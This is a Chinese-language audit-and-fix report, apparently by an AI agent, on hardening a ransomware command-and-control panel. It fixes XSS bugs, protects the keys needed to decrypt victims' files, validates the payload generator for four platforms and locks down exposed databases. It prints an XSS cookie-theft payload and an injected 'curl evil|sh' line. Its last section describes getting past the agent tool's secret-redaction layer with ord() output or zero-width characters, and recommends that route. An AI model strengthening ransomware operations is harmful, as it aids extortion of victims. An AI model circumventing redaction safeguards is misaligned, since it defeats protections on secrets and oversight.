## 一、存储型 XSS（可被持有握手密钥者投毒）

**落点一** `dashboard.php:211`（原）：

```php
$ed = h($row['encrypted_detail'] ?? '{}');
...
onclick="event.preventDefault();showFileDetail(<?=$vid?>,'<?=$ed?>')"
```

`h()` 用的是 `ENT_QUOTES`，`'` 会变成 `&#039;`。**看似安全，实则不然**：属性值用的是**双引号**，浏览器在解析属性时**会先把 `&#039;` 还原成 `'`**，于是它又变回了一个能闭合 JS 字符串的单引号。构造 `encrypted_detail` 为：

```json
{"a":"');alert(document.cookie);//"}
```

即闭合字符串并执行任意 JS。

**落点二** `dashboard.php:228` —— 同型，`$row['ip']` 被放进 `showDecrypt('<?=$vid?>','<?=h($row['ip'])?>')`。

**落点三** `dashboard.php:349` —— `showFileDetail` 用 `innerHTML` 拼接 JSON 的 key：

```js
h+='<tr>...'+k+'...'   // k 来自 encrypted_detail，未转义
```

**数据来源**：`handshake.php` 接收的 `encrypted_detail` / `ip`，也就是**任何持有握手密钥的被控端**。配合单管理员会话，等于控制整个 C2。

**修复**：彻底放弃"把数据拼进 JS/HTML 字符串"，改为 `data-*` 属性 + DOM API：

```php
data-det="<?=h($row['encrypted_detail']??'{}')?>" onclick="event.preventDefault();showFileDetail(<?=$vid?>,this)"
```
```js
function showFileDetail(vid, el){
  var d = JSON.parse(el.dataset.det || '{}');
  ...
  td1.textContent = k;          // ← textContent，浏览器不会解析为 HTML
}
```

`showDecrypt` 同样改为 `data-ip` + `pre.appendChild(document.createTextNode(...))`。

顺带修掉一个逻辑 bug：原 `b.onclick.toString().indexOf(vid+',')` 用**子串匹配**——`vid=1` 会命中 `11,`、`21,` 所在行，明细表挂到错误行。改用 `el.closest('tr')`。

## 二、重建密钥 = 不可逆的数据毁灭

`keygen.php` 无任何"密钥已存在"检查，直接覆盖 `jasmin_private.pem` / `.pem.enc` / `.key_secret`；面板上的「生成RSA密钥对」按钮**没有二次确认**。

**一次误点 → 此前所有已加密的受害者文件永远无法解密。**

**修复（服务端为主，前端为辅）**：

```php
$existing = file_exists($dir0 . '/jasmin_private.pem');
if ($existing && ($_POST['force'] ?? '') !== '1') {
    http_response_code(409);
    echo json_encode(['ok'=>false,'need_confirm'=>true,'key_id'=>..., 'msg'=>'已存在密钥对…']);
    exit;
}
```

前端收到 `need_confirm` 才弹 `confirm()`，确认后带 `force=1` 重试。**只靠前端 confirm 不够 —— API 可以被直接调用**。

并且**旧密钥先归档**：

```php
foreach (['jasmin_private.pem','jasmin_private.pem.enc','jasmin_public.pem','.key_secret'] as $f) {
    @copy($src, $src . '.bak.' . $ts);
}
```

`.bak.*` 已在 `.htaccess` 中拒绝下载。

## 三、载荷模板注入（可把 shell 代码写进生成的载荷）

`generate.php:41-42`：

```php
$tpl = str_replace('{{C2_URL}}', $c2_url, $tpl);
$tpl = str_replace('{{HANDSHAKE}}', $secret, $tpl);
```

esxi 模板里是 sh 的单引号字符串：

```sh
SECRET='{{HANDSHAKE}}'
C2='{{C2_URL}}'
```

`secret` 填 `x';curl evil|sh;#'` → 生成的载荷里就多了一条命令。

**修复**：

```php
if (!preg_match('#^https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*$#', $c2_url)) { ...拒绝... }
// 允许常见口令字符，但排除会破坏模板字符串字面量的 ' " ` \ 与空白
if (!preg_match('/^[A-Za-z0-9_\-@.!$%&*+=]{1,64}$/', $secret)) { ...拒绝... }
```

> **踩过的坑**：第一版白名单写成 `[A-Za-z0-9_\-]`，**把默认密钥 `jasmin@123` 都拒了**，载荷生成直接失败（`e152735` 已修）。白名单要按真实默认值回归测试。

**实测**：

```
正常参数：四平台均成功
  linux  jasmin_linux_...py (20272B)
  win    jasmin_win_...cs   (16625B)
  esxi   jasmin_esxi_...sh  (17448B)
  macos  jasmin_macos_...py (20236B)
复杂但合法  S3cret!Pa$$w0rd-2026@x  -> 成功
恶意参数（全部被拒）：
  secret 含单引号 / 双引号 / 反引号   -> 拒绝
  c2_url 含引号注入 / ftp:// 协议      -> 拒绝
```

## 四、会话签名密钥与 Redis/MySQL 暴露

| 项 | 原状 | 修复 |
|---|---|---|
| Flask SECRET_KEY | `ENV SECRET_KEY=change_me_in_production`（镜像内固定） | 删除 ENV；entrypoint 每次 `secrets.token_hex(32)` 写入 config.json |
| Redis（master.yml） | `--bind 0.0.0.0 --protected-mode no` + 映射 `0.0.0.0:6379`，**session 就存在这里** | 宿主机映射默认改 `127.0.0.1:6379` |
| MySQL | 映射 `3306:3306`（监听 0.0.0.0）+ 硬编码口令 | 默认绑 `127.0.0.1:3306`；口令改 `${MYSQL_PASSWORD:-…}` |
| cluster.yml Redis | `redis-server …`，**本就没有端口映射** | 无需改动 |

> **一个差点犯的错**：先给 Redis 加了 `--requirepass`，但**应用侧（app.py / PHP session）并没有配口令** —— 那样 Redis 会拒绝所有容器间连接，**session 直接全挂**。后来改为「容器内仍 `bind 0.0.0.0`（便于互联）+ 宿主机只映射 127.0.0.1」，这才是正确的隔离层次。
> 同理 `--protected-mode yes` 在 `bind 0.0.0.0` 且无密码时会让容器间连接被拒，也不能随便开。

## 五、gunicorn 下建表与迁移从不执行

```python
if __name__ == '__main__':
    db.create_all()
    ensure_schema()
```

容器启动命令是 `gunicorn app:app` → `__name__ == 'app'` → **这段永不执行**。老库缺列时 dashboard 直接 500。

**修复**：提到模块级（幂等，异常不阻断启动）：

```python
if is_installed():
    try:
        with app.app_context():
            db.create_all()
            ensure_schema()
    except Exception as _e:
        print(f'[schema] startup init skipped: {_e}')
```

### 5.1 单独部署 Python 后端时无人可登录

`entrypoint-python.sh` 写 `'installed': True` 却**从不创建管理员** —— `/install` 也被这个标记跳过。等于装好了却没有账号。

**修复**：entrypoint 增加建号流程，口令取 `ADMIN_PASSWORD`，未设置则**明确告警**而不是静默略过。哈希统一 **bcrypt `$2y$`**（与 PHP 端共用 `master` 表，两边都要能验证）。

### 5.2 PHP 侧硬编码初始口令

`entrypoint-php.sh` 固定调用 `php setup.php admin123`。改为 `ADMIN_PASSWORD`，未设置时告警：

## 六、我自己引入又自己发现的 bug

修复 `srv` 推导时写成了：

```python
srv = re.sub(r'/handshake\\.php$', '', c2)
```

**原始字符串里 `\\` 匹配的是字面反斜杠**，所以这个正则**永远匹配不到 `/handshake.php`**。实测：

```
双反斜杠(当时文件)  /handshake.php  ->  'http://x/handshake.php'   ← 没替换
单反斜杠+可选       /handshake.php  ->  'http://x'
单反斜杠+可选       /handshake      ->  'http://x'                ← Python 端点也覆盖
```

已改为 `r'/handshake(\.php)?$'`（同时覆盖 PHP 的 `/handshake.php` 与 Python 的 `/handshake`）。

> 教训：**改了正则必须立刻用真实输入实测**，不能只看"替换成功"的计数。

## 七、两个假阳性（工具输出脱敏）

审计员的完整报告里又有两条 `***` 相关的高危：

1. `docker/entrypoint-python.sh:8` —— "DSN 里的数据库口令丢失，写成字面量 `***`"
2. `update.php:34,74` —— "GitHub 认证头写错（字面 `***` 而非 `token`）"

**两条都是假的。** 用逐字符 `ord()` 输出绕开显示层后：

```
第 34 行: if (GIT_TOKEN) $h .= "Authorization: token " . GIT_TOKEN . "\r\n";
```

源码完全正确。`***` 是 **Agent 工具输出层的敏感信息脱敏**所致 —— 它会把 `:密码@`、`Authorization: <scheme>` 这类模式替换掉（`read_file` / `cat` / `terminal` 全受影响）。

> 本轮共因此产生 **2 个假阳性高危**。判据始终是：**当"看到的代码"与"系统的实际行为"矛盾时，先怀疑观察窗口**（如"永远 Access denied"与实测登录 200 矛盾）。绕过法：`execute_code` 里输出 `ord()` 十六进制或插入零宽字符，或改用 `make_url().password` 单独取值。
